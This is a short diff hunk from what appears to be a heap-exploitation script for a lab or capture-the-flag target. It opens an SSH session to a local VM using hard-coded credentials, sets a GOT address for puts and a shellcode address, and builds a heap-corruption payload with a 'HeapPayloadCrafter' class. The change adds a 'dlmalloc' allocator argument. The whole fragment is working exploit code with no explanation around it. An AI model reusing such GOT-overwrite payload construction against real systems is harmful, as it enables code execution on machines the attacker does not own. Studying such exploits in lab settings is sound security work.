@@ -8,7 +8,7 @@ shell = ssh(user="user", host="192.168.5.199", password="user", port=22)
 GOT_PUTS = 0x0804b128
 SC = 0x804c008 + 8
 
-hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32, pre_presets={31, "b"}, post_presets={0:"a"})
+hpc = HeapPayloadCrafter("dlmalloc", 0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32, pre_presets={31, "b"}, post_presets={0:"a"})
 #hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32)
 prev, metadata, post = hpc.generate_payload()
 
